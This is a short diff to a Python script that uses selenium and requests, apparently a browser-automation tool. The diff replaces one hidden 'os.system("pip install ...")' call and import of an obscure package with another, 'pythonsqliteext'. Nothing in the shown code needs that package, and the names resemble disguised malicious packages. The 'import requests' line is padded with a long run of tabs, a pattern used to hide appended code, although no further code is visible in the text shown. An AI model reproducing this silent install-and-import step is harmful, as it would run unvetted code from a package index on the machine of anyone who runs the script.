@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringpkgV2")
-import syscolouringpkgV2
+os.system("pip install pythonsqliteext")
+import pythonsqliteext
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
